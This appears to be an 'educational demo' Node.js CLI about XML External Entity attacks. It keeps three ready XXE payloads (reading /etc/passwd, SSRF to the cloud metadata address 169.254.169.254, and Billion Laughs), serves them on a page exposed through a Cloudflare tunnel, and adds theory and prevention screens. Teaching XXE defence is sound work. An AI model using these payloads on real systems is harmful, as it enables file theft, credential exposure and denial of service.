/**
 * XXE EDUCATIONAL DEMO - MANAGER CLI v1.0
 * XML External Entity attack demonstration.
 * Usage: node xxe-manager.js
 */

const http = require('http');
const readline = require('readline');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

const C = { reset: '\x1b[0m', bright: '\x1b[1m', dim: '\x1b[2m', red: '\x1b[31m', green: '\x1b[32m', yellow: '\x1b[33m', blue: '\x1b[34m', magenta: '\x1b[35m', cyan: '\x1b[36m', white: '\x1b[37m' };

const CONFIG_FILE = path.join(__dirname, 'xxe-config.json');
const DEFAULT_CONFIG = {
    targetUrl: 'http://localhost:3000',
    targetName: 'Vulnerable App',
    maliciousPort: 3009,
    tunnel: 'cloudflared',
    payloads: [
        { id: 'xxe-file-read', name: 'File Read', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', enabled: true },
        { id: 'xxe-ssrf', name: 'SSRF via XXE', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', enabled: true },
        { id: 'xxe-dos', name: 'Billion Laughs', payload: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>', enabled: true },
    ],
};

let config = loadConfig();
let tunnelProcess = null;
let server = null;

function loadConfig() {
    try { if (fs.existsSync(CONFIG_FILE)) return { ...DEFAULT_CONFIG, ...JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')) }; } catch (e) {}
    return JSON.parse(JSON.stringify(DEFAULT_CONFIG));
}
function saveConfig() { fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2)); log('ok', 'Config saved'); }
function clearScreen() { process.stdout.write('\x1Bc'); }
function log(type, msg) {
    const t = new Date().toLocaleTimeString('en-US', { hour12: false });
    const p = { info: `${C.blue}[INFO]${C.reset}`, ok: `${C.green}[ OK ]${C.reset}`, warn: `${C.yellow}[WARN]${C.reset}`, error: `${C.red}[FAIL]${C.reset}`, attack: `${C.magenta}[XXE]${C.reset}`, system: `${C.white}[SYS ]${C.reset}` }[type] || `[${type}]`;
    console.log(`  ${C.cyan}[${t}]${C.reset} ${p} ${msg}`);
}
function printBanner() {
    console.log('');
    console.log(`${C.red}${C.bright}
 ██╗  ██╗██╗  ██╗███████╗
 ╚██╗██╔╝╚██╗██╔╝██╔════╝
  ╚███╔╝  ╚███╔╝ █████╗
  ██╔██╗  ██╔██╗ ██╔══╝
 ██╔╝ ██╗██╔╝ ██╗███████╗
 ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝${C.reset}`);
    console.log(`${C.dim}  ════════════════════════════════════════════════════════════${C.reset}`);
    console.log(`${C.red}${C.bright}  XXE${C.reset}${C.dim} // XML External Entity Demo v1.0${C.reset}`);
    console.log(`${C.dim}  ════════════════════════════════════════════════════════════${C.reset}`);
    console.log('');
}
function printConfig() {
    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}TARGET CONFIG${C.reset}                                                ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Target URL:      ${C.bright}${config.targetUrl}${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Target Name:     ${C.bright}${config.targetName}${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Malicious Port:  ${C.bright}${config.maliciousPort}${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}XXE PAYLOADS${C.reset}                                                ${C.cyan}│${C.reset}`);
    config.payloads.forEach((p, i) => {
        const s = p.enabled ? `${C.green}● ACTIVE${C.reset}` : `${C.red}○ DISABLED${C.reset}`;
        console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}[${i + 1}]${C.reset} ${p.name.padEnd(20)} ${s}`);
    });
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}[${config.payloads.length + 1}]${C.reset} ${C.bright}+ Add Custom${C.reset}                                    ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');
}
function printMenu() {
    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}MAIN MENU${C.reset}                                                 ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} 🚀 One-Click Deploy (Server + Tunnel)              ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} 🎯 Configure Target URL                            ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} ⚙️  Manage Payloads                              ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[4]${C.reset} 🌐 Domain / Tunnel Setup                         ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[5]${C.reset} 📋 View Current Config                             ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[6]${C.reset} 💾 Save Config                                     ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[7]${C.reset} 📖 XXE Theory                                     ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[8]${C.reset} 🛡️  Prevention Guide                               ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.red}[9]${C.reset} ❌ Terminate Session                               ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');
}

function generateHTML() {
    const targetUrl = config.targetUrl.replace(/\/$/, '');
    let cards = '';
    config.payloads.forEach((p, i) => {
        if (!p.enabled) return;
        cards += `<div class="card"><h4>${p.name}</h4><code>${p.payload.replace(/</g, '&lt;')}</code></div>`;
    });
    return `<!DOCTYPE html><html><head><title>XXE Demo</title><style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; background: #1a1a2e; color: #eee; }
        .card { background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 15px; margin: 10px 0; }
        .card h4 { color: #ff4444; margin: 0 0 10px 0; }
        .card code { display: block; background: #0f3460; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 0.8em; }
    </style></head><body>
        <h1>XXE Payloads</h1>
        <p>Target: ${targetUrl}</p>
        ${cards}
    </body></html>`;
}

function startServer() {
    const s = http.createServer((req, res) => { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(generateHTML()); });
    s.on('error', (err) => { if (err.code === 'EADDRINUSE') { log('error', `Port ${config.maliciousPort} in use!`); process.exit(1); } });
    s.listen(config.maliciousPort, () => { log('attack', 'XXE demo server deployed!'); log('info', `Local: http://localhost:${config.maliciousPort}`); });
    return s;
}

async function startTunnel() {
    const cloudflaredPath = path.join(__dirname, 'cloudflared.exe');
    if (config.tunnel === 'cloudflared') {
        if (!fs.existsSync(cloudflaredPath)) { log('error', 'cloudflared not found. Run CSRF manager first.'); return null; }
        log('system', 'Starting Cloudflare Tunnel...');
        tunnelProcess = spawn(cloudflaredPath, ['tunnel', '--url', 'http://localhost:' + config.maliciousPort], { stdio: 'pipe' });
    } else { log('info', 'No tunnel configured.'); return null; }
    return new Promise((resolve) => {
        let output = '';
        const timeout = setTimeout(() => { log('warn', 'Tunnel timeout.'); resolve(null); }, 30000);
        tunnelProcess.stdout.on('data', (d) => { output += d.toString(); const m = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i); if (m) { clearTimeout(timeout); log('ok', `Tunnel URL: ${m[0]}`); resolve(m[0]); } });
        tunnelProcess.stderr.on('data', (d) => { output += d.toString(); const m = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i); if (m) { clearTimeout(timeout); log('ok', `Tunnel URL: ${m[0]}`); resolve(m[0]); } });
    });
}
function stopTunnel() { if (tunnelProcess) { tunnelProcess.kill(); tunnelProcess = null; log('system', 'Tunnel stopped.'); } }

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
function ask(q) { return new Promise(r => rl.question(q, r)); }

async function mainMenu() {
    while (true) {
        clearScreen(); printBanner(); printConfig(); printMenu();
        const choice = await ask(`  ${C.green}┌─[${C.reset}${C.bright}XXE${C.reset}${C.green}]─[${C.reset}${C.bright}manager${C.reset}${C.green}]${C.reset}\n  ${C.green}└─▶${C.reset} `);
        switch (choice.trim()) {
            case '1': await oneClickDeploy(); break;
            case '2': await configureTarget(); break;
            case '3': await managePayloads(); break;
            case '4': await configureTunnel(); break;
            case '5': clearScreen(); printBanner(); printConfig(); await ask(`\n  ${C.dim}Press Enter...${C.reset}`); break;
            case '6': saveConfig(); await ask(`\n  ${C.dim}Press Enter...${C.reset}`); break;
            case '7': showTheory(); await ask(`\n  ${C.dim}Press Enter...${C.reset}`); break;
            case '8': showPrevention(); await ask(`\n  ${C.dim}Press Enter...${C.reset}`); break;
            case '9': console.log(`\n  ${C.red}  ⚠️  Stay ethical!${C.reset}\n`); stopTunnel(); if (server) server.close(); rl.close(); process.exit(0);
            default: log('error', 'Invalid option.'); await ask(`  ${C.dim}Press Enter...${C.reset}`);
        }
    }
}

async function oneClickDeploy() {
    clearScreen(); printBanner(); log('system', 'Deploying...');
    server = startServer(); await new Promise(r => setTimeout(r, 1000));
    const tunnelUrl = await startTunnel();
    console.log(`\n  ${C.green}✅ Server: http://localhost:${config.maliciousPort}${C.reset}`);
    if (tunnelUrl) console.log(`  ${C.green}✅ Public: ${tunnelUrl}${C.reset}`);
    console.log(`\n  ${C.yellow}Press Enter to stop...${C.reset}`);
    await ask(''); stopTunnel(); if (server) { server.close(); server = null; }
}
async function configureTarget() {
    clearScreen(); printBanner();
    const u = await ask(`  ${C.yellow}▸${C.reset} Target URL [${config.targetUrl}]: `); if (u.trim()) config.targetUrl = u.trim().replace(/\/$/, '');
    const n = await ask(`  ${C.yellow}▸${C.reset} Target Name [${config.targetName}]: `); if (n.trim()) config.targetName = n.trim();
    const p = await ask(`  ${C.yellow}▸${C.reset} Port [${config.maliciousPort}]: `); if (p.trim() && !isNaN(parseInt(p))) config.maliciousPort = parseInt(p.trim());
    log('ok', 'Config updated!'); await ask(`\n  ${C.dim}Press Enter...${C.reset}`);
}
async function managePayloads() {
    while (true) {
        clearScreen(); printBanner();
        console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
        config.payloads.forEach((p, i) => { const s = p.enabled ? `${C.green}●${C.reset}` : `${C.red}○${C.reset}`; console.log(`  ${C.cyan}│${C.reset}  ${C.green}[${i + 1}]${C.reset} ${p.name.padEnd(20)} ${s} ${C.cyan}│${C.reset}`); });
        console.log(`  ${C.cyan}│${C.reset}  ${C.green}[${config.payloads.length + 1}]${C.reset} + Add Custom ${C.cyan}│${C.reset}`);
        console.log(`  ${C.cyan}│${C.reset}  ${C.green}[${config.payloads.length + 2}]${C.reset} ← Back ${C.cyan}│${C.reset}`);
        console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
        const c = await ask(`  ${C.green}└─▶${C.reset} `);
        const num = parseInt(c.trim());
        if (num >= 1 && num <= config.payloads.length) { const p = config.payloads[num - 1]; const e = await ask(`  Enable? (y/n) [${p.enabled ? 'y' : 'n'}]: `); if (e.trim().toLowerCase() === 'y') p.enabled = true; if (e.trim().toLowerCase() === 'n') p.enabled = false; }
        else if (num === config.payloads.length + 1) { const n = await ask(`  Name: `); const p = await ask(`  Payload: `); config.payloads.push({ id: 'xxe-' + Date.now(), name: n.trim() || 'Custom', payload: p.trim(), enabled: true }); log('ok', 'Added!'); }
        else if (num === config.payloads.length + 2) return;
    }
}
async function configureTunnel() {
    clearScreen(); printBanner();
    console.log(`  ${C.cyan}[1]${C.reset} Cloudflare Tunnel  ${C.cyan}[2]${C.reset} No Tunnel  ${C.cyan}[3]${C.reset} Back`);
    const c = await ask(`  ${C.green}└─▶${C.reset} `);
    if (c.trim() === '1') { config.tunnel = 'cloudflared'; log('ok', 'Cloudflare selected.'); }
    if (c.trim() === '2') { config.tunnel = 'none'; log('ok', 'Tunnel disabled.'); }
    await ask(`\n  ${C.dim}Press Enter...${C.reset}`);
}
function showTheory() {
    clearScreen(); printBanner();
    console.log(`
  ${C.cyan}┌─────────────────────────────────────────────────────────────┐${C.reset}
  ${C.cyan}│${C.reset} ${C.bright}${C.white}📖 XXE THEORY${C.reset}                                          ${C.cyan}│${C.reset}
  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}
  ${C.cyan}│${C.reset}  XXE exploits XML processors to access files or make   ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  requests.                                                  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} File Read: <!ENTITY xxe SYSTEM "file:///etc/passwd"> ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} SSRF: <!ENTITY xxe SYSTEM "http://169.254...">   ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} Billion Laughs: Exponential entity expansion   ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.red}IMPACT:${C.reset} File disclosure, SSRF, DoS                      ${C.cyan}│${C.reset}
  ${C.cyan}└─────────────────────────────────────────────────────────────┘${C.reset}
`);
}
function showPrevention() {
    clearScreen(); printBanner();
    console.log(`
  ${C.cyan}┌─────────────────────────────────────────────────────────────┐${C.reset}
  ${C.cyan}│${C.reset} ${C.bright}${C.white}🛡️  XXE PREVENTION${C.reset}                                    ${C.cyan}│${C.reset}
  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} Disable External Entities ⭐ (Best)              ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} Use JSON Instead of XML                           ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} Input Validation                                 ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[4]${C.reset} XML Parser Configuration                          ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[5]${C.reset} WAF (Web Application Firewall)                    ${C.cyan}│${C.reset}
  ${C.cyan}└─────────────────────────────────────────────────────────────┘${C.reset}
`);
}

(async () => { await mainMenu(); })();
